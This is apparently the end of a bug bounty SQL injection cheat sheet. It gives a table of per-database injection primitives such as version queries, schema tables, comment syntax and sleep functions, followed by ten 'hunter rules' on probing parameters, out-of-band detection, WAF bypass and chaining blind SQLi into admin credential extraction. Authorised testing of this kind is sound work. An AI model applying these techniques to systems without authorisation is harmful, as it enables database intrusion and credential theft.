| Version | `@@version` | `@@version` | `version()` | `banner FROM v$version` | `sqlite_version()` |
| DB name | `database()` | `db_name()` | `current_database()` | `ora_database_name` | `(SELECT name FROM pragma_database_list)` |
| Tables | `information_schema.tables` | `sysobjects` | `information_schema.tables` | `all_tables` | `sqlite_master` |
| Comment | `--` `#` `/**/` | `--` | `--` | `--` | `--` |
| Sleep | `SLEEP(N)` | `WAITFOR DELAY '0:0:N'` | `pg_sleep(N)` | `DBMS_PIPE.RECEIVE_MESSAGE` | heavy query |
| Concat | `concat(a,b)` / `a||b` | `a+b` | `a||b` | `a||b` | `a||b` |
| Stacked | `;` (if allowed) | `;` | `;` | limited | `;` |

---

## MINDSET: TOP 1% HUNTER RULES

1. **Test EVERY parameter** — headers, cookies, JSON keys, XML nodes, path segments. Scanners miss headers 90% of the time.
2. **Fingerprint before firing** — 3 probes to confirm injection type saves 50 payloads.
3. **OAST first for blind** — time-based has false negatives on async code. OAST catches what time-based misses ($20k lesson).
4. **Second-order is underexplored** — most hunters skip it. Registration/profile fields that feed admin queries are gold.
5. **WAF is not a stop sign** — it's an obstacle. Try 5 bypass techniques before concluding not vulnerable.
6. **False positive kills credibility** — confirm with consistent time delay AND boolean AND data extraction.
7. **Chain the bug** — a blind SQLi that extracts admin creds + auth bypass = Critical, not just High.
8. **Android and API are blue ocean** — ContentProviders and GraphQL endpoints are massively undertested.
9. **Work smart** — 5 manual probes on the right endpoint beats 10,000 automated payloads on the wrong one.
10. **Document as you go** — screenshot every step; Burp export the winning request immediately.
